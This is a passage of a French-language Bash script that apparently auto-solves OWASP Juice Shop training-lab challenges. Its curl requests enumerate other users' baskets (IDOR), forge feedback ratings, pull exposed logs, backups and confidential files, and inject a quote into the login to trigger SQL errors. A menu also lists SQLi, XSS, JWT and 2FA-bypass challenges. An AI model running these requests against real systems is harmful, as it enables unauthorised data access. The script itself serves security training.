    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "basketAccessChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "View Basket" "â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] IDOR - Basket enumeration...${NC}\n"

    for id in {1..5}; do
        echo -e "${CYAN}Testing basket ID: $id${NC}"
        
        local resp=$(curl -s "${BASE}/rest/basket/${id}" 2>/dev/null)
        
        if echo "$resp" | jq -e '.data' >/dev/null 2>&1; then
            echo -e "${GREEN}  âœ“ Basket $id accessible${NC}"
            
            if wait_for_challenge "$BASE" "basketAccessChallenge" 3; then
                log_challenge "View Basket" "â­â­" "SUCCESS"
                echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
                read -p "ğŸ‘‰ EntrÃ©e..."
                return 0
            fi
        fi
    done

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 16: Five Star Feedback (â­â­)
challenge_five_star() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Five Star Feedback â­â­      â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: feedbackChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "feedbackChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Five Star Feedback" "â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Manipulate feedback rating...${NC}\n"

    local feedback_data='{"captchaId":0,"captcha":"","comment":"Great!","rating":6}'
    
    curl -s -X POST "${BASE}/api/Feedbacks" \
        -H "Content-Type: application/json" \
        -d "$feedback_data" >/dev/null 2>&1

    if wait_for_challenge "$BASE" "feedbackChallenge" 5; then
        log_challenge "Five Star Feedback" "â­â­" "SUCCESS"
        echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 17: Forged Coupon (â­â­â­â­â­â­)
challenge_forged_coupon() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Forged Coupon â­â­â­â­â­â­     â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: forgedCouponChallenge${NC}"
    echo

    echo -e "${YELLOW}[EXPLOIT] Forge valid coupon code...${NC}\n"
    echo -e "${YELLOW}ğŸ’¡ Ce challenge nÃ©cessite une analyse des coupons existants${NC}"
    
    log_challenge "Forged Coupon" "â­â­â­â­â­â­" "MANUAL"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 18: Manipulate Basket (â­â­â­)
challenge_manipulate_basket() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Manipulate Basket â­â­â­      â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: negativeOrderChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    echo -e "${YELLOW}[EXPLOIT] Basket quantity manipulation...${NC}\n"
    echo -e "${YELLOW}ğŸ’¡ Ce challenge nÃ©cessite une session authentifiÃ©e${NC}"
    
    log_challenge "Manipulate Basket" "â­â­â­" "MANUAL"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 19: Access Log (â­â­â­â­)
challenge_access_log() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Access Log â­â­â­â­           â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: accessLogDisclosureChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "accessLogDisclosureChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Access Log" "â­â­â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Access server logs...${NC}\n"

    local log_paths=(
        "/support/logs/access.log"
        "/ftp/access.log"
    )

    for path in "${log_paths[@]}"; do
        echo -e "${CYAN}Testing: ${BASE}${path}${NC}"
        
        local resp=$(curl -s -o /dev/null -w "%{http_code}" "${BASE}${path}" 2>/dev/null)
        
        if [ "$resp" = "200" ]; then
            if wait_for_challenge "$BASE" "accessLogDisclosureChallenge" 5; then
                log_challenge "Access Log" "â­â­â­â­" "SUCCESS"
                echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
                read -p "ğŸ‘‰ EntrÃ©e..."
                return 0
            fi
        fi
    done

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# CATÃ‰GORIE 4: SENSITIVE DATA EXPOSURE (4 challenges)
# ==========================

# Challenge 20: Confidential Document (â­)
challenge_confidential_doc() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Confidential Document â­     â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: confidentialDocumentChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "confidentialDocumentChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Confidential Document" "â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Access confidential document...${NC}\n"

    local doc_url="${BASE}/ftp/acquisitions.md"
    
    local resp=$(curl -s -o /dev/null -w "%{http_code}" "$doc_url" 2>/dev/null)
    
    if [ "$resp" = "200" ]; then
        if wait_for_challenge "$BASE" "confidentialDocumentChallenge" 5; then
            log_challenge "Confidential Document" "â­" "SUCCESS"
            echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        fi
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 21: Exposed Metrics (â­)
challenge_exposed_metrics() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Exposed Metrics â­           â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: exposedMetricsChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "exposedMetricsChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Exposed Metrics" "â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Access Prometheus metrics...${NC}\n"

    local resp=$(curl -s "${BASE}/metrics" 2>/dev/null)
    
    if echo "$resp" | grep -q "nodejs\|http_"; then
        if wait_for_challenge "$BASE" "exposedMetricsChallenge" 5; then
            log_challenge "Exposed Metrics" "â­" "SUCCESS"
            echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        fi
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 22: Forgotten Sales Backup (â­â­â­â­)
challenge_sales_backup() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Sales Backup â­â­â­â­         â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: forgottenSalesBackupChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "forgottenSalesBackupChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Sales Backup" "â­â­â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Find forgotten backup...${NC}\n"

    local backup_files=(
        "/ftp/coupons_2013.md.bak"
    )

    for backup in "${backup_files[@]}"; do
        local resp=$(curl -s -o /dev/null -w "%{http_code}" "${BASE}${backup}" 2>/dev/null)
        
        if [ "$resp" = "200" ]; then
            if wait_for_challenge "$BASE" "forgottenSalesBackupChallenge" 5; then
                log_challenge "Sales Backup" "â­â­â­â­" "SUCCESS"
                echo -e "\n${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
                read -p "ğŸ‘‰ EntrÃ©e..."
                return 0
            fi
        fi
    done

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 23: Forgotten Dev Backup (â­â­â­â­)
challenge_dev_backup() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Dev Backup â­â­â­â­           â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: forgottenDevBackupChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "forgottenDevBackupChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Dev Backup" "â­â­â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Find developer backup...${NC}\n"

    local resp=$(curl -s -o /dev/null -w "%{http_code}" "${BASE}/ftp/package.json.bak" 2>/dev/null)
    
    if [ "$resp" = "200" ]; then
        if wait_for_challenge "$BASE" "forgottenDevBackupChallenge" 5; then
            log_challenge "Dev Backup" "â­â­â­â­" "SUCCESS"
            echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        fi
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# CATÃ‰GORIE 5: SECURITY MISCONFIGURATION (4 challenges)
# ==========================

# Challenge 24: Error Handling (â­)
challenge_error_handling() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Error Handling â­            â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: errorHandlingChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "errorHandlingChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Error Handling" "â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Trigger detailed error message...${NC}\n"

    local error_payload='{"email":"test@test.com'\''","password":"x"}'
    
    local resp=$(curl -s -X POST "${BASE}/rest/user/login" \
        -H "Content-Type: application/json" \
        -d "$error_payload" 2>/dev/null)

    if echo "$resp" | grep -qi "sql\|sqlite\|error\|stack"; then
        if wait_for_challenge "$BASE" "errorHandlingChallenge" 5; then
            log_challenge "Error Handling" "â­" "SUCCESS"
            echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        fi
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 25: Deprecated Interface (â­â­)
challenge_deprecated_interface() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Deprecated Interface â­â­    â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: deprecatedInterfaceChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "deprecatedInterfaceChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Deprecated Interface" "â­â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Access deprecated B2B interface...${NC}\n"

    curl -s "${BASE}/#/complain" >/dev/null 2>&1
    
    if wait_for_challenge "$BASE" "deprecatedInterfaceChallenge" 5; then
        log_challenge "Deprecated Interface" "â­â­" "SUCCESS"
        echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 26: Vulnerable Library (â­â­â­â­)
challenge_vulnerable_library() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Vulnerable Library â­â­â­â­  â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: knownVulnerableComponentChallenge${NC}"
    echo

    echo -e "${YELLOW}[EXPLOIT] Exploit vulnerable dependency...${NC}\n"
    echo -e "${YELLOW}ğŸ’¡ Ce challenge nÃ©cessite l'analyse de package.json${NC}"
    
    log_challenge "Vulnerable Library" "â­â­â­â­" "MANUAL"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 27: Legacy Typosquatting (â­â­â­â­)
challenge_typosquatting() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Typosquatting â­â­â­â­        â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: typosquattingNpmChallenge${NC}"
    echo

    echo -e "${YELLOW}[EXPLOIT] Find typosquatted dependency...${NC}\n"
    echo -e "${YELLOW}ğŸ’¡ Ce challenge nÃ©cessite l'analyse de package.json${NC}"
    
    log_challenge "Typosquatting" "â­â­â­â­" "MANUAL"

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# CATÃ‰GORIE 6: BONUS (3 challenges)
# ==========================

# Challenge 28: Score Board (â­)
challenge_score_board() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Find Score Board â­          â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: scoreBoardChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "scoreBoardChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Score Board" "â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Find hidden score board...${NC}\n"

    curl -s "${BASE}/rest/admin/application-configuration" >/dev/null 2>&1
    
    if wait_for_challenge "$BASE" "scoreBoardChallenge" 5; then
        log_challenge "Score Board" "â­" "SUCCESS"
        echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
        echo -e "${CYAN}ğŸ”— ${BASE}/#/score-board${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 29: Privacy Policy (â­)
challenge_privacy_policy() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Privacy Policy â­            â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: privacyPolicyChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "privacyPolicyChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Privacy Policy" "â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Read privacy policy...${NC}\n"

    curl -s "${BASE}/#/privacy-security/privacy-policy" >/dev/null 2>&1
    
    if wait_for_challenge "$BASE" "privacyPolicyChallenge" 5; then
        log_challenge "Privacy Policy" "â­" "SUCCESS"
        echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# Challenge 30: Zero Stars (â­)
challenge_zero_stars() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘  Challenge: Zero Stars â­                â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Key: zeroStarsChallenge${NC}"
    echo

    local BASE=$(get_base_url)
    
    local status=$(check_challenge_solved "$BASE" "zeroStarsChallenge")
    if [ "$status" = "SOLVED" ]; then
        echo -e "${GREEN}âœ… Challenge dÃ©jÃ  rÃ©solu !${NC}"
        log_challenge "Zero Stars" "â­" "SUCCESS"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return 0
    fi
    
    echo -e "${YELLOW}[EXPLOIT] Submit zero star feedback...${NC}\n"

    local feedback_data='{"captchaId":0,"captcha":"","comment":"Bad!","rating":0}'
    
    curl -s -X POST "${BASE}/api/Feedbacks" \
        -H "Content-Type: application/json" \
        -d "$feedback_data" >/dev/null 2>&1

    if wait_for_challenge "$BASE" "zeroStarsChallenge" 5; then
        log_challenge "Zero Stars" "â­" "SUCCESS"
        echo -e "${GREEN}ğŸ¯ Challenge rÃ©solu !${NC}"
    fi

    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# AUTO SOLVER
# ==========================

auto_solve_all() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘      AUTO SOLVER - 30 Challenges          â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local BASE=$(get_base_url)

    echo -e "${YELLOW}âš ï¸  Mode automatique - challenges rÃ©solus uniquement${NC}"
    echo -e "${CYAN}Les challenges manuels seront skippÃ©s${NC}\n"

    read -p "Lancer l'auto-solver ? (y/N): " confirm

    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        return
    fi

    echo
    echo -e "${GREEN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    echo -e "${GREEN}ğŸš€ AUTO SOLVER STARTED${NC}"
    echo -e "${GREEN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    echo

    # Reset counter
    CHALLENGES_SOLVED=0

    # Liste des challenges automatisables
    local auto_challenges=(
        "challenge_score_board"
        "challenge_sqli_login"
        "challenge_xss_search"
        "challenge_admin_section"
        "challenge_view_basket"
        "challenge_confidential_doc"
        "challenge_exposed_metrics"
        "challenge_privacy_policy"
        "challenge_zero_stars"
    )

    for challenge_func in "${auto_challenges[@]}"; do
        echo -e "${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        $challenge_func
        sleep 2
    done

    echo
    echo -e "${GREEN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    echo -e "${GREEN}âœ… AUTO SOLVER COMPLETED${NC}"
    echo -e "${GREEN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"

    show_progress

    echo
    read -p "ğŸ‘‰ EntrÃ©e pour continuer..."
}

# ==========================
# VÃ‰RIFICATION GLOBALE
# ==========================

verify_all_challenges() {
    clear
    banner
    
    local BASE=$(get_base_url)
    
    show_all_solved "$BASE"

    read -p "ğŸ‘‰ EntrÃ©e... "
}

# ==========================
# STATISTIQUES
# ==========================

show_statistics() {
    clear
    banner
    echo -e "${CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${CYAN}â•‘          Challenge Statistics             â•‘${NC}"
    echo -e "${CYAN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    if [ ! -f "$CHALLENGES_LOG" ]; then
        echo -e "${YELLOW}Aucun challenge rÃ©solu pour le moment${NC}"
        read -p "ğŸ‘‰ EntrÃ©e..."
        return
    fi

    echo -e "${GREEN}ğŸ“Š Statistiques locales${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    
    local total=$(wc -l < "$CHALLENGES_LOG")
    local success=$(grep -c "SUCCESS" "$CHALLENGES_LOG")
    
    echo -e "   Total tentatives: ${total}"
    echo -e "   RÃ©ussis: ${GREEN}${success}${NC}"
    echo

    echo -e "${GREEN}ğŸ“ Derniers challenges${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    tail -n 10 "$CHALLENGES_LOG" | sed 's/^/   /'

    echo
    read -p "ğŸ‘‰ EntrÃ©e..."
}

# ==========================
# MENU PRINCIPAL
# ==========================

menu_exploits() {
    while true; do
        clear
        banner
        echo -e "${CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${CYAN}â•‘  Juice Shop - 30 Challenges v8.0 FIXED   â•‘${NC}"
        echo -e "${CYAN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        echo

        echo -e "${MAGENTA}â•â•â• INJECTION (8) â•â•â•${NC}"
        echo -e "${GREEN}1)  ğŸ”“ Login Admin (SQLi) â­â­${NC}"
        echo -e "${GREEN}2)  ğŸ’‰ DOM XSS â­${NC}"
        echo -e "${GREEN}3)  ğŸ’‰ Bonus Payload â­â­${NC}"
        echo -e "${GREEN}4)  ğŸ’‰ Client Side XSS â­â­â­${NC}"
        echo -e "${GREEN}5)  ğŸ“Š NoSQL Injection â­â­â­â­${NC}"
        echo -e "${GREEN}6)  ğŸ’‰ Reflected XSS â­${NC}"
        echo -e "${GREEN}7)  ğŸ’‰ API-only XSS â­â­â­${NC}"
        echo -e "${GREEN}8)  ğŸ” LDAP Injection â­â­â­â­â­â­${NC}"
        
        echo
        echo -e "${MAGENTA}â•â•â• BROKEN AUTHENTICATION (5) â•â•â•${NC}"
        echo -e "${GREEN}9)  ğŸ”‘ Password Strength â­â­${NC}"
        echo -e "${GREEN}10) â“ Security Question â­${NC}"
        echo -e "${GREEN}11) ğŸ« JWT Cracking â­â­â­â­â­${NC}"
        echo -e "${GREEN}12) ğŸ” OAuth Password â­â­â­${NC}"
        echo -e "${GREEN}13) ğŸ“± 2FA Bypass â­â­â­â­â­${NC}"

        echo
        echo -e "${MAGENTA}â•â•â• BROKEN ACCESS CONTROL (6) â•â•â•${NC}"
